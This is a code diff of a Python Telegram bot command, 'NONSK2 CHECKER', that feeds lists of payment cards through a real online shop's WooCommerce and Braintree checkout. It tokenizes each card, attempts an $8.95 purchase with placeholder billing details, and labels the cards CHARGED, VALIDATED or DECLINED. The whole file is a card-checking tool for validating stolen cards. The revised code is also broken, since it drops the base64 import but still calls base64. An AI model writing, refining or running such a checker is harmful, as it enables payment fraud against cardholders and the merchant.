@@ -1,19 +1,18 @@
 import requests
-import json
 import time
-import base64
+import json
 
 def process_nonsk2_command(bot, message):
     chat_id = message.chat.id
-    card_data = message.text.split()[1:]  # Get the card data from the command
-    if card_data:
-        total_cards = len(card_data)
+    cards = message.text.split()[1:]
+    if cards:
+        total_cards = len(cards)
         start_time = time.time()
         results = []
         initial_message = "↯ NONSK2 CHECKER\n\n"
         msg = bot.send_message(chat_id, initial_message + get_footer_info(total_cards, start_time, message.from_user.username))
 
-        for card in card_data:
+        for card in cards:
             result = check_nonsk2(card)
             results.append(f"Card: {card}\nResponse => {result}")
             bot.edit_message_text(
@@ -26,106 +25,67 @@ def process_nonsk2_command(bot, message):
         bot.send_message(chat_id, "Please provide card details in the format: /nonsk2 cc|mm|yy|cvc")
 
 def check_nonsk2(card):
-    cc, mes, ano, cvv = card.split('|')
-    retry = 0
+    try:
+        retry = 0
+        while retry < 3:
+            # Replace these with your own proxy details or remove if not using proxies
+            hostname = "your_proxy_hostname"
+            port = "your_proxy_port"
+            username = "your_proxy_username"
+            password = "your_proxy_password"
 
-    while retry < 3:
-        try:
-            cookies = requests.cookies.RequestsCookieJar()
-            correlation_id = str(time.time()).replace('.', '')
+            # Split the card details
+            cc, mm, yy, cvv = card.split("|")
 
-            # Mockaroo API call to get random user details
-            key = "bf1e2760"
-            country = 'united_states'
-            user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36'
-            url = f"https://my.api.mockaroo.com/{country}.json?key={key}"
-            response = requests.get(url, headers={'User-Agent': user_agent}, cookies=cookies)
-            user_data = response.json()
+            # Make initial requests to gather necessary data
+            Cookies = "cookies.txt"
+            r = requests.session()
+            response = r.get("https://reinrespects.com/product/respect-our-parks-dog-bandana-with-a-cause/")
+            if response.status_code != 200:
+                return f"Failed to access product page. Status code: {response.status_code}"
 
-            # Set default values for fields in case they are missing
-            first = user_data.get('first', 'John')
-            last = user_data.get('last', 'Doe')
-            email = user_data.get('email', 'john.doe@example.com')
-            phone = user_data.get('phone', '555-555-5555')
-            street = user_data.get('street', '123 Main St')
-            zip_code = user_data.get('zip', '12345')
-            city = user_data.get('city', 'Anytown')
-            state1 = user_data.get('state1', 'CA')
-            state2 = user_data.get('state2', 'CA')
+            response = r.get("https://reinrespects.com/checkout/")
+            if response.status_code != 200:
+                return f"Failed to access checkout page. Status code: {response.status_code}"
 
-            # Fetch IP
-            response = requests.get("https://api.ipify.org/", headers={'User-Agent': user_agent}, cookies=cookies)
-            ip_address = response.text
-
-            # Add product to cart
-            url = "https://reinrespects.com/product/respect-our-parks-dog-bandana-with-a-cause/"
-            data = {
-                "attribute_pa_color": "green",
-                "wc_braintree_paypal_amount": 8.95,
-                "wc_braintree_paypal_currency": "USD",
-                "wc_braintree_paypal_locale": "en_us",
-                "wc_braintree_paypal_single_use": 1,
-                "wc_braintree_paypal_product_id": 690,
-                "quantity": 1,
-                "add-to-cart": 690,
-                "product_id": 690,
-                "variation_id": 701
-            }
-            headers = {
-                "User-Agent": user_agent,
-                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-                "Referer": "https://reinrespects.com/product/respect-our-parks-dog-bandana-with-a-cause/",
-            }
-            response = requests.post(url, headers=headers, data=data, cookies=cookies)
-
-            # Proceed to checkout
-            url = "https://reinrespects.com/checkout/"
-            response = requests.get(url, headers={'User-Agent': user_agent}, cookies=cookies)
-            checkout_nonce = extract_string(response.text, 'woocommerce-process-checkout-nonce" value="', '"')
-            wcal_guest_capture_nonce = extract_string(response.text, 'wcal_guest_capture_nonce" value="', '"')
-            client_token_nonce = extract_string(response.text, 'client_token_nonce":"', '"')
+            checkout_nonce = extract_string(response.text, 'id="woocommerce-process-checkout-nonce" value="', '"')
+            wcal_guest_capture_nonce = extract_string(response.text, 'id="wcal_guest_capture_nonce" value="', '"')
+            client_token_nonce = extract_string(response.text, '"client_token_nonce":"', '"')
 
             if not checkout_nonce or not wcal_guest_capture_nonce or not client_token_nonce:
-                raise ValueError("Failed to retrieve necessary nonce values from the checkout page.")
+                return "Failed to retrieve necessary nonce values from the checkout page."
 
-            # Get client token
-            url = "https://reinrespects.com/wp-admin/admin-ajax.php"
+            # Request for client token
             data = {
                 "action": "wc_braintree_credit_card_get_client_token",
                 "nonce": client_token_nonce
             }
-            response = requests.post(url, headers=headers, data=data, cookies=cookies)
-            encoded_data = extract_string(response.text, '{"success":true,"data":"', '"')
+            headers = {
+                "Referer": "https://reinrespects.com/checkout/",
+                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
+            }
+            response = r.post("https://reinrespects.com/wp-admin/admin-ajax.php", data=data, headers=headers)
+            if response.status_code != 200:
+                return f"Failed to retrieve client token. Status code: {response.status_code}"
 
-            if not encoded_data:
-                raise ValueError("Failed to retrieve encoded client token data.")
+            authorizationFingerprint = json.loads(base64.b64decode(extract_string(response.text, '{"success":true,"data":"', '"'))).get("authorizationFingerprint")
+            if not authorizationFingerprint:
+                return "Failed to retrieve authorization fingerprint."
 
-            decoded_data = base64.b64decode(encoded_data).decode('utf-8')
-            authorization_fingerprint = json.loads(decoded_data).get('authorizationFingerprint')
-
-            if not authorization_fingerprint:
-                raise ValueError("Failed to retrieve authorization fingerprint.")
-
-            # Tokenize credit card
-            url = "https://payments.braintree-api.com/graphql"
-            headers.update({
-                "Content-Type": "application/json",
-                "Braintree-Version": "2018-05-10",
-                "Authorization": f"Bearer {authorization_fingerprint}"
-            })
+            # Tokenize the credit card
             data = {
                 "clientSdkMetadata": {
                     "source": "client",
                     "integration": "custom",
-                    "sessionId": correlation_id
+                    "sessionId": "example-session-id"
                 },
                 "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }",
                 "variables": {
                     "input": {
                         "creditCard": {
                             "number": cc,
-                            "expirationMonth": mes,
-                            "expirationYear": ano,
+                            "expirationMonth": mm,
+                            "expirationYear": yy,
                             "cvv": cvv
                         },
                         "options": {
@@ -135,63 +95,64 @@ def check_nonsk2(card):
                 },
                 "operationName": "TokenizeCreditCard"
             }
-            response = requests.post(url, headers=headers, json=data, cookies=cookies)
-            response_json = response.json()
-            token = response_json['data']['tokenizeCreditCard']['token']
+            headers = {
+                "Content-Type": "application/json",
+                "Authorization": f"Bearer {authorizationFingerprint}"
+            }
+            response = r.post("https://payments.braintree-api.com/graphql", json=data, headers=headers)
+            if response.status_code != 200:
+                return f"Failed to tokenize credit card. Status code: {response.status_code}"
 
-            # Checkout
-            url = "https://reinrespects.com/?wc-ajax=checkout"
+            token = json.loads(response.text).get("data", {}).get("tokenizeCreditCard", {}).get("token")
+            if not token:
+                return "Failed to retrieve token."
+
+            # Complete the purchase
             data = {
-                "billing_first_name": first,
-                "billing_last_name": last,
+                "billing_first_name": "John",
+                "billing_last_name": "Doe",
                 "billing_country": "US",
-                "billing_address_1": street,
-                "billing_city": city,
-                "billing_state": state2,
-                "billing_postcode": zip_code,
-                "billing_phone": phone,
-                "billing_email": email,
+                "billing_address_1": "123 Main St",
+                "billing_city": "Anytown",
+                "billing_state": "CA",
+                "billing_postcode": "12345",
+                "billing_phone": "5555555555",
+                "billing_email": "john.doe@example.com",
                 "wcal_guest_capture_nonce": wcal_guest_capture_nonce,
-                "_wp_http_referer": "/checkout/",
-                "mailchimp_woocommerce_newsletter": 1,
-                "shipping_country": "US",
-                "shipping_method[0]": "free_shipping:2",
                 "payment_method": "braintree_credit_card",
-                "wc-braintree-credit-card-card-type": "visa",
-                "wc-braintree-credit-card-3d-secure-order-total": "8.95",
+                "wc_braintree_credit_card_card_type": "visa",
+                "wc_braintree_credit_card_3d_secure_order_total": "8.95",
                 "wc_braintree_credit_card_payment_nonce": token,
-                "wc_braintree_paypal_amount": "8.95",
-                "wc_braintree_paypal_currency": "USD",
-                "wc_braintree_paypal_locale": "en_us",
                 "terms": "on",
                 "terms-field": 1,
-                "woocommerce-process-checkout-nonce": checkout_nonce,
-                "_wp_http_referer": "/?wc-ajax=update_order_review"
+                "woocommerce-process-checkout-nonce": checkout_nonce
             }
-            headers.update({
-                "Accept": "application/json, text/javascript, */*; q=0.01",
-                "X-Requested-With": "XMLHttpRequest",
-                "Origin": "https://reinrespects.com",
-                "Referer": "https://reinrespects.com/checkout/"
-            })
-            response = requests.post(url, headers=headers, data=data, cookies=cookies)
-            response_data = response.json()
+            headers = {
+                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
+            }
+            response = r.post("https://reinrespects.com/?wc-ajax=checkout", data=data, headers=headers)
+            if response.status_code != 200:
+                return f"Failed to complete the purchase. Status code: {response.status_code}"
+
+            response_data = json.loads(response.text)
 
             if "order-received" in response.text:
-                receipt_url = response_data.get('redirect', 'Receipt URL not found')
-                return f"CHARGED {card} <a href='{receipt_url}' target='_blank'>Receipt</a> {ip_address}"
-            elif "The card verification number does not match" in response.text:
-                return f"VALIDATED {card} {response_data['messages']} {ip_address}"
-            elif "The provided address does not match the billing address" in response.text:
-                return f"VALIDATED {card} {response_data['messages']} {ip_address}"
-            else:
-                return f"DECLINED {card} {json.dumps(response_data)}"
+                receipturl = response_data.get("redirect", "").replace("\\", "")
+                return f"CHARGED {card} <a href='{receipturl}' target='_blank'>Receipt</a>"
 
-        except Exception as e:
-            retry += 1
-            if retry >= 3:
-                return f"An error occurred: {str(e)}"
-            time.sleep(1)
+            elif "The card verification number does not match" in response.text:
+                return f"VALIDATED {card} The card verification number does not match"
+
+            elif "The provided address does not match" in response.text:
+                return f"VALIDATED {card} The provided address does not match"
+
+            elif response_data.get("messages"):
+                return f"DECLINED {card} {response_data.get('messages')}"
+
+            return f"DECLINED {card} {json.dumps(response_data)}"
+
+    except Exception as e:
+        return f"An error occurred: {str(e)}"
 
 def extract_string(content, start, end):
     try:
